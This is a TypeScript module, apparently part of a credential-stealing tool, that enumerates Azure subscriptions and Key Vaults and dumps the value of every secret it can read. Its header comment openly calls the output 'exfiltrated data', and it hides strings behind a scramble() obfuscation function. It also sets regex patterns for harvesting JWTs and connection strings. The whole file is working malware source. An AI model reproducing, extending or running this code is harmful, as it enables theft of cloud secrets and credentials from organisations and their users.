// ═════════════════════════════════════════════════════════════════════════════
// AzureKeyVaultService — enumerates secrets from Azure Key Vault vaults
//
// Always returns `success: true` with an `ok` flag so error details are
// included in the exfiltrated data even when every vault fails.
// ═════════════════════════════════════════════════════════════════════════════

import { Provider } from "../base";
import type { ProviderResult } from "../types";
import { resolveToken } from "./auth";
import {
  azureFetch,
  getKeyVaultSecretLatest,
  type KeyVaultSecretItem,
  listKeyVaultSecrets,
} from "./client";

declare function scramble(str: string): string;

// ── ARM subscription / vault listing ───────────────────────────────────────

interface ArmSubscription {
  subscriptionId: string;
  displayName: string;
  state: string;
}

interface ArmResource {
  id: string;
  name: string;
  type: string;
  location: string;
  properties?: Record<string, unknown>;
}

interface ArmListResponse {
  value: ArmResource[];
  nextLink?: string;
}

interface ArmSubscriptionListResponse {
  value: ArmSubscription[];
  nextLink?: string;
}

interface VaultResult {
  vaultName: string;
  subscriptionId?: string;
  secrets: Record<string, string | { error: string }>;
  error?: string;
}

// ── Enumerate subscriptions via ARM ─────────────────────────────────────────

async function listSubscriptions(): Promise<ArmSubscription[]> {
  try {
    const response = await azureFetch<ArmSubscriptionListResponse>({
      vaultName: "management",
      service: "management",
      path: scramble("/subscriptions"),
      query: { [scramble("api-version")]: scramble("2022-12-01") },
    });
    return response.value ?? [];
  } catch {
    return [];
  }
}

// ── Discover vaults via ARM ─────────────────────────────────────────────────

async function discoverVaultsViaArm(): Promise<
  Array<{ name: string; subscriptionId: string }>
> {
  const vaults: Array<{ name: string; subscriptionId: string }> = [];

  try {
    const subscriptions = await listSubscriptions();
    if (subscriptions.length === 0) return vaults;

    for (const sub of subscriptions) {
      if (sub.state !== "Enabled") continue;

      try {
        const basePath = `/subscriptions/${sub.subscriptionId}/resources`;
        const filterValue = "resourceType eq 'Microsoft.KeyVault/vaults'";
        let currentPath: string | undefined =
          `${basePath}?api-version=2021-04-01&$filter=${encodeURIComponent(filterValue)}`;

        do {
          const response: ArmListResponse | undefined =
            await azureFetch<ArmListResponse>({
              vaultName: "management",
              service: "management",
              path: currentPath,
              query: undefined,
            });

          for (const resource of response?.value ?? []) {
            vaults.push({
              name: resource.name,
              subscriptionId: sub.subscriptionId,
            });
          }

          currentPath = response?.nextLink
            ? extractRelativePath(response.nextLink)
            : undefined;
        } while (currentPath);
      } catch {
        continue;
      }
    }
  } catch {
    // ARM not accessible
  }

  return vaults;
}

// ── Vault names from environment ────────────────────────────────────────────

function getVaultNamesFromEnv(): string[] {
  const envVal =
    process.env[scramble("AZURE_KEY_VAULT_NAME")] ??
    process.env["KEY_VAULT_NAME"] ??
    process.env["AZURE_VAULT_NAME"];
  if (!envVal) return [];
  return envVal
    .split(",")
    .map((n) => n.trim())
    .filter(Boolean);
}

// ── Helpers ─────────────────────────────────────────────────────────────────

function extractRelativePath(url: string): string {
  try {
    const u = new URL(url);
    return u.pathname + u.search;
  } catch {
    return "";
  }
}

function extractSecretNameFromId(id: string): string {
  const match = id.match(/\/secrets\/([^/]+)/);
  if (!match?.[1]) return id;
  return decodeURIComponent(match[1]);
}

// ── Main Provider ───────────────────────────────────────────────────────────

export class AzureKeyVaultService extends Provider {
  private vaultNames: string[] = [];
  private vaultErrors: Array<{ vault: string; error: string }> = [];

  constructor() {
    super("azure", "keyvault", {
      jwt: /eyJ[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+/g,
      connection_string: /[A-Za-z]+:\/\/[^@\s]+@[^;\s]+/g,
    });
  }

  async execute(): Promise<ProviderResult> {
    const errors: string[] = [];
    this.vaultErrors = [];

    // 1. Auth check
    try {
      await resolveToken(scramble("https://vault.azure.net/.default"));
    } catch (e) {
      errors.push(
        `Azure auth failed: ${e instanceof Error ? e.message : String(e)}`,
      );
    }

    // 2. Vault discovery
    const envVaults = getVaultNamesFromEnv();
    let armVaults: Array<{ name: string; subscriptionId: string }> = [];

    if (envVaults.length === 0) {
      try {
        armVaults = await discoverVaultsViaArm();
      } catch (e) {
        errors.push(
          `ARM discovery failed: ${e instanceof Error ? e.message : String(e)}`,
        );
      }
    }

    const allVaultNames = [...envVaults, ...armVaults.map((v) => v.name)];
    this.vaultNames = [...new Set(allVaultNames)];

    // 3. Fetch secrets
    const vaultResults: VaultResult[] = [];

    if (this.vaultNames.length > 0 && errors.length === 0) {
      for (const vaultName of this.vaultNames) {
        try {
          const secretItems = await listKeyVaultSecrets(vaultName);

          const secrets: Record<string, string | { error: string }> = {};
          for (const item of secretItems) {
            const name = extractSecretNameFromId(item.id);
            try {
              const value = await getKeyVaultSecretLatest(vaultName, name);
              secrets[name] = value ?? "BINARY_OR_EMPTY";
            } catch (e) {
              secrets[name] = {
                error: e instanceof Error ? e.message : String(e),
              };
            }
          }

          vaultResults.push({ vaultName, secrets });
        } catch (err) {
          const errorMsg = err instanceof Error ? err.message : String(err);
          this.vaultErrors.push({ vault: vaultName, error: errorMsg });
          vaultResults.push({ vaultName, secrets: {}, error: errorMsg });
        }
      }
    }

    const dumped = vaultResults.filter((v) => !v.error).length;

    return this.success({
      ok: errors.length === 0 && dumped > 0,
      authError: errors.length > 0 ? errors : undefined,
      vaultsFound: this.vaultNames.length,
      dumped,
      errored: vaultResults.filter((v) => v.error).length,
      vaults: vaultResults,
      vaultErrors: this.vaultErrors.length > 0 ? this.vaultErrors : undefined,
    });
  }
}
